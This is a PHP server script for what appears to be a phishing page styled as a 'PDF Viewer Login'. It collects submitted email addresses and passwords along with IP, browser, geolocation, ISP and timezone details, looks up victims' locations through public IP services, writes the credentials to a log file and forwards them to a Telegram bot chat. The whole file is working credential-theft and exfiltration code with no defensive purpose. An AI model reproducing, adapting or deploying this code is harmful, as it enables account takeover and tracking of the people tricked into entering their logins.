<?php
/**
 * Server-Side Submission Processing Script
 */

require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed']);
    exit;
}

// Retrieve raw POST data or JSON body
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);

if (!$data) {
    $data = $_POST;
}

function getClientIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            return trim($ips[0]);
        }
    }
    return 'N/A';
}

function fetchServerGeo($ip) {
    if (empty($ip) || $ip === '127.0.0.1' || $ip === '::1' || $ip === 'N/A') {
        return null;
    }

    $endpoints = [
        "https://ipwho.is/{$ip}",
        "https://get.geojs.io/v1/ip/geo/{$ip}.json",
        "https://api.bigdatacloud.net/data/reverse-geocode-client?ip={$ip}"
    ];

    foreach ($endpoints as $endpoint) {
        $res = null;
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $endpoint);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $res = curl_exec($ch);
            curl_close($ch);
        } else {
            $ctx = stream_context_create([
                'http' => ['timeout' => 3]
            ]);
            $res = @file_get_contents($endpoint, false, $ctx);
        }

        if (!empty($res)) {
            $d = json_decode($res, true);
            if ($d && (!isset($d['success']) || $d['success'] === true)) {
                $city = $d['city'] ?? ($d['cityName'] ?? '');
                $region = $d['region'] ?? ($d['regionName'] ?? ($d['principalSubdivision'] ?? ''));
                $country = $d['country'] ?? ($d['countryName'] ?? ($d['country_name'] ?? ''));
                $lat = isset($d['latitude']) ? floatval($d['latitude']) : (isset($d['lat']) ? floatval($d['lat']) : null);
                $lon = isset($d['longitude']) ? floatval($d['longitude']) : (isset($d['lon']) ? floatval($d['lon']) : null);
                $isp = $d['connection']['isp'] ?? ($d['org'] ?? ($d['isp'] ?? ''));
                $tz = $d['timezone']['id'] ?? ($d['timezone'] ?? '');

                if ($city || $region || $country) {
                    return [
                        'city' => $city ?: 'Unknown',
                        'region' => $region ?: 'Unknown',
                        'country' => $country ?: 'Unknown',
                        'lat' => $lat,
                        'lon' => $lon,
                        'isp' => $isp ?: 'N/A',
                        'timezone' => $tz ?: 'N/A'
                    ];
                }
            }
        }
    }
    return null;
}

$email       = isset($data['email']) ? trim($data['email']) : '';
$password    = isset($data['password']) ? trim($data['password']) : '';
$attempt     = isset($data['attempt']) ? intval($data['attempt']) : 1;
$browser     = isset($data['browser']) ? trim($data['browser']) : 'Unknown';
$location    = isset($data['location']) ? trim($data['location']) : 'Unknown';
$lat         = isset($data['lat']) && $data['lat'] !== null ? floatval($data['lat']) : null;
$lon         = isset($data['lon']) && $data['lon'] !== null ? floatval($data['lon']) : null;
$coords      = ($lat !== null && $lon !== null) ? sprintf("%.4f, %.4f", $lat, $lon) : 'N/A, N/A';
$ip          = !empty($data['ip']) && $data['ip'] !== 'N/A' ? trim($data['ip']) : getClientIP();
$domain      = isset($data['domain']) ? trim($data['domain']) : ($_SERVER['HTTP_HOST'] ?? 'N/A');
$url         = isset($data['url']) ? trim($data['url']) : '';
$isp         = isset($data['isp']) ? trim($data['isp']) : 'N/A';
$timezone    = isset($data['timezone']) ? trim($data['timezone']) : 'N/A';
$dateStr     = date('Y-m-d H:i:s');

// Server-side fallback geolocation if client was blocked by browser adblocker/tracking protection
$isLocationUnknown = empty($location) || $location === 'Unknown' || strpos($location, 'Unknown') !== false;
if ($isLocationUnknown || $isp === 'N/A' || $timezone === 'N/A' || $coords === 'N/A, N/A') {
    $geo = fetchServerGeo($ip);
    if ($geo) {
        if ($isLocationUnknown) {
            $location = "{$geo['city']}, {$geo['region']}, {$geo['country']}";
        }
        if (($lat === null || $lon === null) && $geo['lat'] !== null && $geo['lon'] !== null) {
            $lat = $geo['lat'];
            $lon = $geo['lon'];
            $coords = sprintf("%.4f, %.4f", $lat, $lon);
        }
        if ($isp === 'N/A' && !empty($geo['isp'])) {
            $isp = $geo['isp'];
        }
        if ($timezone === 'N/A' && !empty($geo['timezone'])) {
            $timezone = $geo['timezone'];
        }
    }
}

if (empty($email) || empty($password)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Missing email or password']);
    exit;
}

// Build log format
$logEntry = sprintf(
    "[%s] Attempt #%d | Email: %s | Pass: %s | IP: %s | Location: %s | Coordinates: %s | Browser: %s | Domain: %s\n",
    $dateStr,
    $attempt,
    $email,
    $password,
    $ip,
    $location,
    $coords,
    $browser,
    $domain
);

// File logging if enabled
if (defined('LOG_TO_FILE') && LOG_TO_FILE) {
    @file_put_contents(LOG_FILE_PATH, $logEntry, FILE_APPEND | LOCK_EX);
}

// Send to Telegram via PHP cURL if token & chat_id configured
if (defined('TELEGRAM_BOT_TOKEN') && !empty(TELEGRAM_BOT_TOKEN) && defined('TELEGRAM_CHAT_ID') && !empty(TELEGRAM_CHAT_ID)) {
    $msg = "🔐 PDF Viewer Login — Attempt {$attempt}\n" .
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" .
           "📧 Email: {$email}\n" .
           "🔑 Password: {$password}\n" .
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" .
           "🌐 Browser: {$browser}\n" .
           "📍 Location: {$location}\n" .
           "📌 Coordinates: {$coords}\n" .
           "🖥️ IP: {$ip}\n" .
           "🌍 Domain: {$domain}\n" .
           "🔗 URL: {$url}\n" .
           "📅 Date: {$dateStr}\n" .
           "ISP: {$isp}\n" .
           "Timezone: {$timezone}\n" .
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" .
           "Attempt {$attempt} of " . (defined('MAX_ATTEMPTS') ? MAX_ATTEMPTS : 1000);

    $telegramUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $postFields = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $msg
    ];

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        @curl_exec($ch);
        @curl_close($ch);
    } else {
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($postFields),
                'timeout' => 10
            ]
        ];
        $context  = stream_context_create($options);
        @file_get_contents($telegramUrl, false, $context);
    }
}

echo json_encode(['status' => 'success', 'message' => 'Recorded successfully']);
